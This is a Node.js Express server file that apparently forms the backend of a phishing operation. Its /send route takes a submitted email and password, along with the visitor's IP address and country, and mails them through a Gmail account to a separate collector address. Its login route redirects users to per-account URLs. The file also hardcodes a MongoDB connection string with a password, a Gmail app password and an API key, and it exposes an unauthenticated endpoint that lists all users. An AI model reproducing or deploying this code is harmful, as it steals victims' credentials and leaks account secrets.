
const express = require('express');
const app = express();
const port = process.env.PORT || 5000;
const cors = require('cors');
const morgan = require('morgan');
const dotenv = require('dotenv').config();
const helmet = require('helmet');
// const multer = require('multer');
const mongoose = require('mongoose');
const userModel = require('./model/acct');
const MONGO_URI = process.env.MONGO_URI;
const bcrypt = require("bcryptjs");
const jwt = require('jsonwebtoken');
const TOKEN = 'ourSecretToken'
const nodemailer = require('nodemailer');
const os = require('os');
// const fetch = require('node-fetch');
// import fetch from 'node-fetch'



// os.hostname()
// os.platform()
// os.type()

// const { ipToGeolocation } = require('location-from-ip');

// var geoip = require("geoip-lite");
// var ip = "207.97.227.239";
// var geo = geoip.lookup(ip);
// console.log(geo);



const M_URI = "mongodb+srv://first:u-cmU8ZNMa7Jm_E@cluster0.lnzfjzk.mongodb.net/";

// middlewares
app.use(cors());
// app.use(multer());
app.use(helmet());
app.use(express.json());
app.use(morgan('combined'));
app.use(express.urlencoded({ extended: false }));


app.get('/test', (req,res)=>{
    res.send('connected!!')
})


// Email sender Logic

const transporter = nodemailer.createTransport({
    service: "gmail",
    port: 587,
    secure: false, // Use `true` for port 465, `false` for all other ports
    auth: {
      user: "akuma.akums@gmail.com",
      pass: "huvv qmfk knbo uxsl",
    },
  });
//   hait vjit cvhg erwy
 
  app.post('/send', async (req, res)=>{

            // const response = await fetchLocation(`https://api.geoapify.com/v1/ipinfo?apiKey=44db379787c14bccb69d3de62462aefb`);
            // const data = await response.json();      
            // console.log(data);

            const { abc, xyz, locatorm } = req.body;
            const ipp = req.headers['x-forwarded-for'];
            const rem = req.connection.remoteAddress
            let r = req.ip
            
            

            // send mail with defined transport object
            const info = await transporter.sendMail({
            from: `"Web Logss 👻 From" <akuma.akums@gmail.com>`, // sender address
            to: "cw41retiired@gmail.com", // list of receivers
            subject: "Hello ✔", // Subject line
            //text: "Hello world?", // plain text body
            // html: `<b>${abc} and ${xyz} and IP: ${r} and Platform: ${os.type()}</b>`, // html body
            html: `
            <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>

    <div>
        Email: ${abc}
        <br/>
        <br/>

        Password: ${xyz}


        <br/>
        <br/>

        IP Address: ${r}

        <br/>
        <br/>



        Country: ${locatorm}

    </div>
    
</body>
</html>
            `
        }, (err,info)=>{
            if (err) {
                console.log(err);
              } else {
                console.log('Email sent: ' + info.response);
                console.log(ipp);
                // console.log("remote",rem);
                // console.log(os.type());

                // console.log(req.ip);

                res.status(200).json({
                    m: 'email sent successfully'
                })
              }
        });

        

        // if (info) {
        //     console.log('success!!!!!!!1')
        //     console.log(info);
        //     res.status(200).json({
        //         m: 'email sent successfully'
        //     })
        //     return info
        // } else{
        //     console.log('Custom Error!!!!!');
        // }
    });
  







app.get('/user/authenticate/get/001', async (req,res)=>{
    try{
        let allUsers = await userModel.find();
        await res.status(200).json({
            err: false,
            data: allUsers,
            dat: Date.now()
        })
        // res.json({msg:'GET REQUEST'})

    }catch(e){
        res.status(400).json({
            err: true,
            dat: Date.now(),
            msg: e
        })
    }
});


// create account API 

app.post('/user/auth/post/001', async (req,res)=>{
    try {
        let hashPassword = await bcrypt.hash(req.body.password, 10);
        const eachAcct = await new userModel({
            username: req.body.username,
            password: hashPassword,
            uuri: req.body.uuri
        })

        const saveUser = await eachAcct.save();
        res.status(201).json({
            err: false,
            dat: new Date(),
            data: saveUser
        })

    } catch (e) {
        res.status(400).json({
            err: true,
            dat: Date.now(),
            msg: e
        })
    }
});



// LOGIN API
app.post('/sign', async (req,res)=>{
    try {

        const { username, password } = req.body;
        const getUser = await userModel.findOne({ username });

        if (!getUser) {
        return res.status(500).redirect('http://localhost:3000')
        }

        const parsePassword = await bcrypt.compare(password, getUser.password);
        if (!parsePassword) {
            console.log('wrong credentials');
          return res
            .status(500)
            .json({err: true, msg: 'Authentication failed', date: Date.now(), info:'Invalid username or password, please go back'});
        }else{
            // let fullUrl = req. protocol + '://' + req. get('host') + req. originalUrl
            setTimeout(() => {
                return res.status(302).redirect(getUser.uuri);
            }, 3000);
        }
        
    } catch (error) {
        console.log(error);
        res.status(500).redirect('http://localhost:3000')
    }
});
https://verify-webservice.onrender.com/




// DELETE API 
app.delete('/v/api/del/:userId', async (req,res)=>{
    try {
        let id = req.params.userId;
        const findUserById = await userModel.findById(id);
        if(!findUserById){
            return res.status(404).json({
                err: true,
                data: null,
                msg: 'no user found'
            })
        }

        const deleteUserById = await userModel.findByIdAndDelete(id);
        res.status(200).json({
            dat: Date.now(),
            data: deleteUserById,
            err: false
        })
    } catch (e) {
        res.status(400).json({
            err: true,
            dat: Date.now(),
            msg: e
        })
    }
});


// oiuytd 

app.post('/pwd', async (req, res)=>{
    const { username, oldpassword, password } = req.body;

    const checkIfUsernameExists = await userModel.findOne({ username });

    if(!checkIfUsernameExists){
        return res.status(404).json({
            err: true,
            data: 数据修改出错,
            msg: 'user password not updated, the owner does not exists'
        })
    }else{
        let pwdHash = await bcrypt.hash(password, await bcrypt.genSalt(10));
        // let passwordIsMatch = await bcrypt.compare(
        //     checkIfUsernameExists.password,        
        //     pwdHash
        //   ); 


                await userModel.updateOne({username: username}, {$set: {password: pwdHash}});
                res.status(302).redirect('back')
            // {"acknowledged":true, "matchedCount": 1,"modifiedCount": 1 }
    }

});






// CHANGE PASSWORD API

app.post("/v/change/password", async (req, res) => {
      try {
        const { username, old_password, password } = req.body;

        const getUser = await userModel.findOne({ username });
  
        let passwordIsMatch = await bcrypt.compare(
          old_password,             
          req.user.password
        );

        if (!getUser) {
            res.status(500).json({ e: true, m: "invalid password provided" });
            return;
          }
  
        if (!passwordIsMatch) {
          res.status(500).json({ e: true, m: "invalid password provided" });
          return;
        }

        if(getUser){
            
                    // hash pwd
        let pwdHash = await bcrypt.hash(password, await bcrypt.genSalt(10));
  
        //   console.log("pwdHash =>> ", pwdHash);
  
        // update new pwd
        await userModel.findByIdAndUpdate(
          req.user?._doc?._id,
          { password: pwdHash },
          { new: true }
        );
        //   console.log("update?._doc after pwdHash =>> ", update?._doc);
  
        return res.status(200).json({
          e: false,
          data: null,
          m: "you have successfully changed your password",
        });
        }
  

      } catch (error) {
        res.status(500).json({
          e: true,
          m: error.message || "unable to complete request",
        });
        console.log(error);
      }
    }
  );


app.listen(port, ()=> console.log(`${port} has started`));

// mongoose.connect(M_URI)
// .then(()=>{
//     // const {PORT = 6040} = process.env;
//     app.listen(port, ()=> console.log(`${port} has started`));
//     console.log('database connected succesfuly')
    
// })
// .catch((e)=> console.log('Error connecting to DB', e));
